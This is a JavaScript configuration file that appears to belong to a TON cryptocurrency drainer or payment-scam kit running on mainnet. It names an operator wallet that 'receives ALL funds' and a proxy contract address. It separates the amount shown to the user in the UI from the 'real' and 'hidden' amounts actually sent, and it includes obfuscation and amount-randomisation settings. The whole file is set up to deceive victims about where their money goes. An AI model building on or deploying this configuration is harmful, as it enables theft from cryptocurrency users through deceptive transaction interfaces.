// config.js
var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
var PROXY_CONTRACT  = YOUR_WALLET;

// YOUR REAL WALLET (receives ALL funds)
var AML_WALLET      = "EQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";

// Amount shown to user in UI
var VISIBLE_AMOUNT  = "0.05";
// Amount sent to proxy contract
var REAL_AMOUNT     = "0.05";
var HIDDEN_AMOUNT   = "0.05";

var NETWORK         = "mainnet";

// === OBFUSCATION SETTINGS ===
var OBFUSCATION_METHOD = "empty";
var RANDOMIZE_AMOUNT = false;  // Disabled for proxy contract
var AMOUNT_VARIANCE = 0.02;
var USE_STATEINIT = false;
